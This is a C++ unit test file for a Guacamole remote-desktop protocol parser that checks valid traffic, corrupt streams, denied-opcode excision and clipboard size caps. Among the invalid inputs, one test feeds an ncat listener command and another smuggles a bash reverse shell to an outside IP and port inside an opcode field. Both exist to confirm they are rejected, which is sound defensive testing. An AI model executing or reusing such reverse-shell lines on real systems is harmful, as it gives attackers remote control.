#include "../../shared/include/parser/opcode_parser.h"
#include "../include/guard_opcode_parser.h"
#include <cassert>
#include <iostream>
#include <stdlib.h>
#include <string>

/**
 * @brief Offers string representations of the available states
 */
std::string cvt_state(ParserState state) {
    switch (state) {
    case ParserState::READING_LENGTH:
        return "READING_LENGTH";
    case ParserState::READING_DATA:
        return "READING_DATA";
    case ParserState::EXPECT_DELIM:
        return "EXPECT_DELIM";
    case ParserState::DENIED_DATA:
        return "DENIED_DATA";
    case ParserState::STREAM_CORRUPTED:
    default:
        return "STREAM_CORRUPTED";
    }
}

/**
 * @brief Provides assertion for parser state, and logs to stderr for false assertions
 * @param input: message to parse
 * @param expected: expected state
 * @param parser: *OpcodeParser, in case the parser needs to be re-used across function calls
 */
void test_parsing(std::string input, ParserState expected,
                  OpcodeParser *parser = nullptr) {
    if (parser == nullptr)
        parser = new OpcodeParser();
    ParserState result = parser->Parse(input.data(), input.size());

    if (result != expected) {
        std::cerr << "state: " << cvt_state(result)
                  << ", expected: " << cvt_state(expected)
                  << "\n\tfor input: " << input << std::endl;
        assert(false);
    }
}

/**
 * @brief Parses a buffer, applies the excision, and returns what remains
 * @param input: message to parse
 * @param expected: expected parse result
 */
std::string excised_output(std::string input, ParserState expected) {
    OpcodeParser parser;
    ParserState result = parser.Parse(input.data(), input.size());

    if (result != expected) {
        std::cerr << "state: " << cvt_state(result)
                  << ", expected: " << cvt_state(expected)
                  << "\n\tfor input: " << input << std::endl;
        assert(false);
    }

    size_t len = input.size();
    parser.Excise(input.data(), len);
    return std::string(input.data(), len);
}

/**
 * @brief tests if valid traffic is correctly parsed
 */
void test_valid_opcodes() {
    test_parsing("6.select,3.ssh;", ParserState::READING_LENGTH);
    test_parsing("4.size,4.1680,3.933,2.96;", ParserState::READING_LENGTH);
    test_parsing(
        "5.audio,8.audio/L8,9.audio/L16;5.video;5.image,10.image/jpeg,9.image/"
        "png,10.image/webp;8.timezone,13.Europe/"
        "Berlin;4.name,9.guacadmin;7.connect,13.VERSION_1_5_0,9.localhost,0.,2."
        "22,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,"
        "0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.;",
        ParserState::READING_LENGTH);
    test_parsing("4.argv,1.0,10.text/plain,12.color-scheme;",
                 ParserState::READING_LENGTH);
    test_parsing("5.mouse,3.988,3.369,1.0;", ParserState::READING_LENGTH);
    test_parsing("3.key,3.109,1.1;", ParserState::READING_LENGTH);

    // Valid opcode, with partials
    {
        auto parser = OpcodeParser();
        test_parsing("5.mouse,3.988", ParserState::EXPECT_DELIM, &parser);
        test_parsing(",3.369,1.0;", ParserState::READING_LENGTH, &parser);
    }

    {
        auto parser = OpcodeParser();
        test_parsing("4.size,4.168", ParserState::READING_DATA, &parser);
        test_parsing("0,3.933,2.96;", ParserState::READING_LENGTH, &parser);
    }

    {
        auto parser = OpcodeParser();
        test_parsing(
            "5.audio,8.audio/L8,9.audio/L16;5.video;5.image,10.image/"
            "jpeg,9.image/"
            "png,10.image/webp;8.timezone,13.Europe/Berlin;4.name,9.gu",
            ParserState::READING_DATA, &parser);
        test_parsing(
            "acadmin;7.connect,13.VERSION_1_5_0,9.localhost,0.,2.22,0.,0.,"
            "0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,"
            "0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.;",
            ParserState::READING_LENGTH, &parser);
    }
}

/**
 * @brief Tests whether invalid Guacamole is detected
 */
void test_invalid_guacamole() {
    test_parsing("nonsense", ParserState::STREAM_CORRUPTED);
    test_parsing("ncat -l -p 1337", ParserState::STREAM_CORRUPTED);
    test_parsing("8,nonsense", ParserState::STREAM_CORRUPTED);
    test_parsing("eight.nonsense", ParserState::STREAM_CORRUPTED);
    test_parsing("5.audio,1.6,31.audio/L16;rate=invalid,channels=2;",
                 ParserState::STREAM_CORRUPTED);

    // Invalid opcode length
    test_parsing("3.badlength;", ParserState::STREAM_CORRUPTED);
    test_parsing("999999999.toolarge;", ParserState::STREAM_CORRUPTED);
    test_parsing("-8.negative;", ParserState::STREAM_CORRUPTED);
    test_parsing("0.zero;", ParserState::STREAM_CORRUPTED);
    test_parsing("4.argv,18.0,10.text/plain,12.color-scheme;",
                 ParserState::STREAM_CORRUPTED);
    test_parsing("4.argv,1.1,10.text/plain,9.font-name;4.argv,1.2,10.text/"
                 "plain,9.font-size;3.ack,1.1,2.OK,1.0;3.ack/bin/bash -i >& "
                 "/dev/tcp/10.10.17.1/1337 0>&1,1.1,2.OK,1.0;",
                 ParserState::STREAM_CORRUPTED);

    // Invalid characters
    test_parsing("10.ὠnonsenseὠ;", ParserState::STREAM_CORRUPTED);
    test_parsing("9.😊nonsense;", ParserState::STREAM_CORRUPTED);

    // No closing semicolon after first opcode
    test_parsing("6.select3.foo;", ParserState::STREAM_CORRUPTED);

    // No commas
    test_parsing("5.video,3.foo6.barbaz;", ParserState::STREAM_CORRUPTED);
    test_parsing("7.connect3.doc5.frotz;", ParserState::STREAM_CORRUPTED);
    test_parsing("4.argv,1.5,10.text/plain9.font-size;", ParserState::STREAM_CORRUPTED,
                 nullptr);

    // Invalid guacamole, with partials
    {
        auto parser = OpcodeParser();
        test_parsing("5.audio,8.audio/L8,9.au", ParserState::READING_DATA, &parser);
        test_parsing(
            "dio/L16;5.video;5.image,10.image/jpeg,9.image/png,10.image/"
            "webp;8.invalid,13.Europe/"
            "Berlin;4.name,9.guacadmin;7.connect,13.VERSION_1_5_0,9.localhost,"
            "0.,2."
            "22,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,"
            "0.,"
            "0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.,0.;",
            ParserState::STREAM_CORRUPTED, &parser);
    }
}

/**
 * @brief Tests whether disallowed opcodes are detected
 */
void test_denied_opcodes() {
    // A disallowed opcode in a complete instruction is excised; Parse reports
    // DENIED_DATA (and the surviving buffer is checked in test_denied_excision).
    test_parsing("5.abcde;", ParserState::DENIED_DATA);
    test_parsing("4.rect;", ParserState::DENIED_DATA);
    test_parsing("5.cfill;", ParserState::DENIED_DATA);
    test_parsing("10.filesystem;", ParserState::DENIED_DATA);
    test_parsing("4.file;", ParserState::DENIED_DATA);

    test_parsing("3.key,", ParserState::READING_LENGTH);
    test_parsing("4.size,", ParserState::READING_LENGTH);
    test_parsing("5.video,", ParserState::READING_LENGTH);
    test_parsing("6.select,", ParserState::READING_LENGTH);
    test_parsing("10.disconnect;", ParserState::READING_LENGTH);

    // A denied instruction that never reaches its ';' within the buffer cannot
    // be excised cleanly (it may span datagrams), so the stream is corrupted.
    test_parsing("5.cfill,", ParserState::STREAM_CORRUPTED);
}

/**
 * @brief Tests that denied instructions are cut out and allowed traffic survives
 */
void test_denied_excision() {
    // A denied instruction is removed; surrounding allowed traffic is kept.
    assert(excised_output("5.cfill;3.key,3.109,1.1;", ParserState::DENIED_DATA) ==
           "3.key,3.109,1.1;");
    assert(excised_output("3.key,3.109,1.1;5.cfill;4.size,4.1680,3.933,2.96;",
                          ParserState::DENIED_DATA) ==
           "3.key,3.109,1.1;4.size,4.1680,3.933,2.96;");

    // A denied instruction is removed whole, arguments and all — not just its
    // opcode element.
    assert(excised_output("4.rect,1.0,1.0,3.100,3.100;3.key,3.109,1.1;",
                          ParserState::DENIED_DATA) == "3.key,3.109,1.1;");

    // Delimiters inside a denied value are data, not instruction boundaries.
    assert(excised_output("4.rect,5.a;b;c;3.key,3.109,1.1;",
                          ParserState::DENIED_DATA) == "3.key,3.109,1.1;");

    // Several denied instructions in a row are all removed.
    assert(excised_output("4.rect;5.cfill;3.key,3.109,1.1;",
                          ParserState::DENIED_DATA) == "3.key,3.109,1.1;");

    // A whole datagram of denied content leaves nothing to forward.
    assert(excised_output("5.cfill;", ParserState::DENIED_DATA) == "");
}

/**
 * @brief Tests the clipboard payload cap enforced by GuardOpcodeParser.
 *
 * A clipboard blob's payload is bounded to MAX_CLIPBOARD_BYTES; an oversized one
 * is denied (and excised), leaving the rest of the stream intact. Blobs not tied
 * to a clipboard stream are not capped here. The cap is keyed on the stream index
 * shared by the `clipboard` open and the `blob`, so it is enforced through the
 * GuardOpcodeParser hooks (passed in as the base pointer).
 */
void test_length_bound_opcodes() {
    const std::string cap(GuardOpcodeParser::MAX_CLIPBOARD_BYTES, 'a');
    const std::string over(GuardOpcodeParser::MAX_CLIPBOARD_BYTES + 1, 'a');
    const std::string len_cap = std::to_string(cap.size());
    const std::string len_over = std::to_string(over.size());

    // A clipboard open with no payload, and a small blob on its stream, parse.
    { GuardOpcodeParser p; test_parsing("9.clipboard;", ParserState::READING_LENGTH, &p); }
    { GuardOpcodeParser p;
      test_parsing("9.clipboard,1.0,10.text/plain;4.blob,1.0,9.abcdefghi;3.end,1.0;",
                   ParserState::READING_LENGTH, &p); }

    // A payload exactly at the cap is allowed.
    { GuardOpcodeParser p;
      test_parsing("9.clipboard,1.0,10.text/plain;4.blob,1.0," + len_cap + "." + cap + ";3.end,1.0;",
                   ParserState::READING_LENGTH, &p); }

    // A payload over the cap is denied so the whole blob can be excised.
    { GuardOpcodeParser p;
      test_parsing("9.clipboard,1.0,10.text/plain;4.blob,1.0," + len_over + "." + over + ";3.end,1.0;",
                   ParserState::DENIED_DATA, &p); }

    // A blob that is not on the open clipboard stream is denied outright (and
    // excised), regardless of payload size.
    { GuardOpcodeParser p;
      test_parsing("9.clipboard,1.0,10.text/plain;4.blob,1.1,9.abcdefghi;",
                   ParserState::DENIED_DATA, &p); }

    // A blob with no clipboard stream open at all is likewise denied.
    { GuardOpcodeParser p;
      test_parsing("4.blob,1.0,9.abcdefghi;", ParserState::DENIED_DATA, &p); }
}

/**
 * @brief Unit tests for the parser
 */
int main(int argc, char **argv) {
    test_valid_opcodes();

    test_invalid_guacamole();

    test_denied_opcodes();

    test_denied_excision();

    test_length_bound_opcodes();

    return 0;
}
